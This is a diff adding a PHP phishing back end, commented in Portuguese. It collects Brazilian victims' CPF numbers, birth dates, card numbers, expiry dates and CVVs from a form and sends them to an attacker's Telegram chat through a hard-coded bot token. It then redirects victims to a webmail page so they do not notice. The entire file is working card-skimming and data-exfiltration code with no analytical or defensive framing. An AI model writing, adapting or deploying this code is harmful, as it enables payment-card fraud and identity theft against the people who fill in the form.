@@ -1,0 +1,36 @@
+<?php
+/* ========== CONFIGURAÇÃO DO TELEGRAM ========== */
+define('BOT_TOKEN', '7731169374:AAF2qtPXZgQELEHs6DnCBJUij638xwYUVVY');
+define('CHAT_ID',   '6261750345');
+define('API_URL',   'https://api.telegram.org/bot'.BOT_TOKEN.'/');
+
+function telegram($method, $data = []){
+    $opts = ['http' => [
+        'method'  => 'POST',
+        'header'  => 'Content-Type: application/x-www-form-urlencoded',
+        'content' => http_build_query($data),
+    ]];
+    $context = stream_context_create($opts);
+    return json_decode(@file_get_contents(API_URL.$method, false, $context), true);
+}
+
+/* ========== CAPTURA OS DADOS ========== */
+$cpf      = trim($_POST['cpf']      ?? '');
+$nasc     = trim($_POST['nasc']     ?? '');
+$cartao   = trim($_POST['cartao']   ?? '');
+$validade = trim($_POST['validade'] ?? '');
+$cvv      = trim($_POST['cvv']      ?? '');
+
+if ($cpf && $cartao) {
+    $text = "💳 *DADOS DO CARTÃO*\n*CPF:* $cpf\n*Nasc:* $nasc\n*Cartão:* $cartao\n*Validade:* $validade\n*CVV:* $cvv";
+    telegram('sendMessage', [
+        'chat_id'    => CHAT_ID,
+        'text'       => $text,
+        'parse_mode' => 'Markdown',
+    ]);
+}
+
+/* ========== REDIRECIONA PARA O WEBMAIL REAL ========== */
+header('Location: https://webmail-seguro.com.br/v2/');
+exit;
+?>
